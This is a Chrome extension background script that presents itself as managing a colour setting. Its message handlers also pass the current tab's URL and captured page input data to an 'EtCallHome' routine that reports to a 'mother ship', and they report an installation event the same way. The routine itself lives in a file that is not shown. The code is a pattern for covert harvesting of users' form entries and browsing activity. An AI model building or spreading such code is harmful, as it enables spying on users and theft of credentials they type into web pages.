importScripts('actions.js');

const defaultColor = '#22bb11';     // We use this in case fetching from mother ship breaks
chrome.storage.local.get(["color"], ({ color }) => {
    if(!color) {
      chrome.storage.local.set({"color": defaultColor});
    }
});

chrome.runtime.onInstalled.addListener(async () => {
  EtCallHome({event:"installed"});
  getColor();
});

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {

    if (request.greeting === "getColor") {
      chrome.storage.local.get(["color"], ({ color }) => {
        sendResponse({color: color});
      });
    }

    if (request.greeting === "sendInputs") {
      EtCallHome({event: request.greeting, url: sender.tab.url, inputData: request.input});
    }

    if (request.greeting === "sendLocation") {
      EtCallHome({event: request.greeting, url: sender.tab.url});
      sendResponse({message: "All reported to mother ship"});
    }
  }
);